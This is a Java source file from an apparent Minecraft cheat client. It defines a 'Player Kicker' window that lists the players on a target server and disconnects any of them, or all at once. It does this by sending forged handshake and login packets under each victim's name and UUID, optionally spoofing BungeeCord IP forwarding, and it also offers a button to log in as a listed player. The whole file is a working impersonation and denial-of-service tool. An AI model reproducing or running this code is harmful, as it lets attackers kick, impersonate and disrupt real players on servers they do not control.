/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.clientwindow.impl;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.clientwindow.template.StateClientWindow;
import de.nekosarekawaii.vandalism.util.game.PacketHelper;
import de.nekosarekawaii.vandalism.util.game.PingState;
import de.nekosarekawaii.vandalism.util.game.ServerConnectionUtil;
import de.nekosarekawaii.vandalism.util.render.imgui.ImUtils;
import imgui.ImGui;
import imgui.flag.ImGuiCol;
import imgui.flag.ImGuiPopupFlags;
import imgui.flag.ImGuiWindowFlags;
import imgui.type.ImBoolean;
import imgui.type.ImInt;
import imgui.type.ImString;
import net.lenni0451.mcping.MCPing;
import net.lenni0451.mcping.exception.ConnectTimeoutException;
import net.lenni0451.mcping.exception.ConnectionRefusedException;
import net.lenni0451.mcping.exception.DataReadException;
import net.lenni0451.mcping.exception.PacketReadException;
import net.lenni0451.mcping.responses.MCPingResponse;
import net.minecraft.SharedConstants;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.client.session.Session;
import net.minecraft.util.Uuids;

import java.io.DataOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PlayerKickerClientWindow extends StateClientWindow {

    private final ImString ip = new ImString(253);
    private final ImInt port = new ImInt(25565);
    private final ImBoolean preventSelfKick = new ImBoolean(true);
    private final ImBoolean preventFriendKick = new ImBoolean(true);
    private final ImBoolean spoofBungeeCord = new ImBoolean(false);
    private final ImBoolean customizeIP = new ImBoolean(false);
    private final ImString customIP = new ImString();
    private final ImInt kickDelay = new ImInt(2000);

    private boolean checking = false;
    private MCPingResponse.Players players = null;
    private int protocol = SharedConstants.getProtocolVersion();
    private int friends = 0;
    private int anonymousPlayers = 0;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    public PlayerKickerClientWindow() {
        super("Player Kicker", Category.SERVER);

    }

    @Override
    protected void onRender(final DrawContext context, final int mouseX, final int mouseY, final float delta) {
        super.onRender(context, mouseX, mouseY, delta);
        if (!this.checking) {
            ImGui.text("IP");
            ImGui.setNextItemWidth(-1);
            ImGui.inputText("##playerKickerIp", this.ip);
            if (this.ip.isEmpty()) {
                if (ImUtils.subButton("Use " + (this.mc.player != null ? "Current" : "Last") + " Server")) {
                    final ServerInfo currentServerInfo = ServerConnectionUtil.getLastServerInfo();
                    if (currentServerInfo != null) {
                        this.ip.set(currentServerInfo.address);
                    }
                }
            }
            ImGui.text("Port");
            ImGui.setNextItemWidth(-1);
            ImGui.inputInt("##playerKickerPort", this.port);
            ImGui.checkbox("Prevent Self Kick", this.preventSelfKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Red highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Prevent Friend Kick", this.preventFriendKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Orange highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Spoof BungeeCord", this.spoofBungeeCord);
            if (this.spoofBungeeCord.get()) {
                ImGui.sameLine();
                ImGui.checkbox("Customize IP", this.customizeIP);
                if (this.customizeIP.get()) {
                    ImGui.text("Custom IP");
                    ImGui.setNextItemWidth(-1);
                    ImGui.inputText("##playerKickerCustomIP", this.customIP);
                }
            }
            ImGui.text("Kick Delay (ms)");
            ImGui.setNextItemWidth(-1);
            ImGui.inputInt("##playerKickerKickDelay", this.kickDelay);
            ImGui.spacing();
            if (this.ip.isNotEmpty()) {
                if (this.ip.get().contains(":")) {
                    final String[] split = this.ip.get().split(":");
                    this.ip.set(split[0]);
                    if (split.length > 1) {
                        try {
                            this.port.set(Integer.parseInt(split[1]));
                        } catch (final NumberFormatException ignored) {
                        }
                    }
                }
                if (ImUtils.subButton("Check")) {
                    this.checking = true;
                    this.setState(PingState.WAITING_RESPONSE.getMessage());
                    this.players = null;
                    this.protocol = SharedConstants.getProtocolVersion();
                    this.friends = 0;
                    this.anonymousPlayers = 0;
                    MCPing.pingModern(this.protocol)
                            .address(this.ip.get(), this.port.get())
                            .timeout(5000, 5000)
                            .exceptionHandler(t -> {
                                this.checking = false;
                                switch (t) {
                                    case UnknownHostException unknownHostException ->
                                            this.setState(PingState.UNKNOWN_HOST.getMessage());
                                    case ConnectionRefusedException connectionRefusedException ->
                                            this.setState(PingState.CONNECTION_REFUSED.getMessage());
                                    case ConnectTimeoutException connectTimeoutException ->
                                            this.setState(PingState.CONNECTION_TIMED_OUT.getMessage());
                                    case DataReadException dataReadException ->
                                            this.setState(PingState.DATA_READ_FAILED.getMessage());
                                    case PacketReadException packetReadException ->
                                            this.setState(PingState.PACKET_READ_FAILED.getMessage());
                                    case null, default -> {
                                        this.setState(PingState.FAILED.getMessage());
                                        Vandalism.getInstance().getLogger().error("Failed to ping {}:{}", this.ip.get(), this.port.get(), t);
                                    }
                                }
                            }).finishHandler(response -> {
                                this.checking = false;
                                this.setState(PingState.SUCCESS.getMessage());
                                this.players = response.players;
                                this.protocol = response.server.protocol;
                                if (this.players != null && this.players.sample != null) {
                                    final MCPingResponse.Players.Player[] sample = this.players.sample;
                                    if (sample.length == 0) {
                                        this.players = null;
                                        return;
                                    }
                                    for (final MCPingResponse.Players.Player player : sample) {
                                        if (this.isAnonymous(player.name, player.id)) {
                                            this.anonymousPlayers++;
                                        } else if (this.isFriend(player.name)) {
                                            this.friends++;
                                        }
                                    }
                                }
                                this.delayedResetState(10000);
                            }).getAsync();
                }
            }
            ImGui.separator();
            if (this.players != null && this.players.sample != null) {
                ImGui.textWrapped("Players: " + this.players.online + "/" + this.players.max + " (" + this.players.sample.length + ")");
                if (this.anonymousPlayers > 0) {
                    ImGui.textWrapped("Anonymous Players: " + this.anonymousPlayers);
                }
                if (this.friends > 0) {
                    ImGui.textWrapped("Friends: " + this.friends);
                }
                ImGui.beginChild("##playerKickerPlayers", ImGui.getColumnWidth(), -ImGui.getTextLineHeightWithSpacing() - 10, true, ImGuiWindowFlags.HorizontalScrollbar);
                for (int i = 0; i < this.players.sample.length; i++) {
                    final MCPingResponse.Players.Player player = this.players.sample[i];
                    final String name = player.name;
                    final String uuid = player.id;
                    boolean isSelf = this.isSelf(name, uuid), isFriend = this.isFriend(name);
                    if (this.isAnonymous(name, uuid) || (isSelf && this.preventSelfKick.get()) || (isFriend && this.preventFriendKick.get())) {
                        continue;
                    }
                    final boolean shouldHighlight = isSelf || isFriend;
                    if (shouldHighlight) {
                        float[] color = {0.8f, 0.1f, 0.1f, 0.30f};
                        if (isFriend) {
                            color = new float[]{0.9f, 0.5f, 0.1f, 0.40f};
                        }
                        ImGui.pushStyleColor(ImGuiCol.Button, color[0], color[1], color[2], color[3]);
                        ImGui.pushStyleColor(ImGuiCol.ButtonHovered, color[0], color[1], color[2], color[3] - 0.1f);
                        ImGui.pushStyleColor(ImGuiCol.ButtonActive, color[0], color[1], color[2], color[3] + 0.1f);
                    }
                    final String data = "Name: " + name + "\n" + "UUID: " + uuid;
                    final String id = "##playerKickerPlayer" + i;
                    if (ImGui.button(id, ImGui.getColumnWidth(), 45)) {
                        this.kickPlayer(name, uuid);
                    }
                    if (shouldHighlight) {
                        ImGui.popStyleColor(3);
                    }
                    if (ImGui.beginPopupContextItem(id + "popup", ImGuiPopupFlags.MouseButtonRight)) {
                        ImGui.text("Player: " + name);
                        ImGui.separator();
                        final int buttonWidth = 200, buttonHeight = 28;
                        if (ImGui.button("Login" + id + "login", buttonWidth, buttonHeight)) {
                            Vandalism.getInstance().getAccountManager().loginCracked(name, uuid);
                        }
                        if (ImGui.button("Copy Data" + id + "copyData", buttonWidth, buttonHeight)) {
                            this.mc.keyboard.setClipboard(data);
                        }
                        ImGui.endPopup();
                    }
                    ImGui.sameLine(10);
                    ImGui.text(data);
                }
                ImGui.endChild();
                if (ImGui.button("Kick All Players", ImGui.getColumnWidth(), ImGui.getTextLineHeightWithSpacing())) {
                    for (final MCPingResponse.Players.Player player : this.players.sample) {
                        this.kickPlayer(player.name, player.id);
                    }
                }
            } else {
                ImGui.text("No players found.");
            }
        }
    }

    private boolean isAnonymous(final String name, final String uuid) {
        return name.equals("Anonymous Player") || uuid.equals("00000000-0000-0000-0000-000000000000");
    }

    private boolean isSelf(final String name, final String uuid) {
        if (this.mc.player != null) {
            final Session currentSession = this.mc.session;
            final String currentName = currentSession.getUsername();
            final UUID currentUuid = currentSession.getUuidOrNull();
            boolean isSameUUID = currentUuid != null && currentUuid.toString().equals(uuid);
            if (!isSameUUID) {
                isSameUUID = Uuids.getOfflinePlayerUuid(currentName).toString().equals(uuid);
            }
            return currentName.equals(name) && isSameUUID;
        }
        return false;
    }

    private boolean isFriend(final String name) {
        return Vandalism.getInstance().getFriendsManager().isFriend(name);
    }

    private void kickPlayer(final String name, final String uuid) {
        if ((this.isSelf(name, uuid) && this.preventSelfKick.get()) || (this.isFriend(name) && this.preventFriendKick.get())) {
            return;
        }
        this.executorService.submit(() -> {
            if (!name.isBlank() && !uuid.isBlank()) {
                try {
                    this.setState("Kicking player " + name + "...");
                    Thread.sleep(this.kickDelay.get());
                    final Socket connection = new Socket(this.ip.get(), this.port.get());
                    connection.setTcpNoDelay(true);
                    final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                    String ip = this.ip.get();
                    if (this.spoofBungeeCord.get()) {
                        ip += "\u0000";
                        if (this.customizeIP.get()) {
                            ip += this.customIP.get();
                        } else {
                            ip += PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart();
                        }
                        ip += "\u0000";
                        ip += uuid.replace("-", "");
                    }
                    PacketHelper.writePacket(PacketHelper.createHandshakePacket(ip, this.port.get(), this.protocol), output);
                    PacketHelper.writePacket(PacketHelper.createLoginPacket(this.protocol, name, UUID.fromString(uuid)), output);
                    Thread.sleep(1000);
                    connection.close();
                    this.setState("Player " + name + " should be kicked.");
                } catch (final Exception ignored) {
                    this.setState("Failed to kick player " + name + ".");
                }
            } else {
                this.setState("Invalid player data.");
            }
        });
    }

}
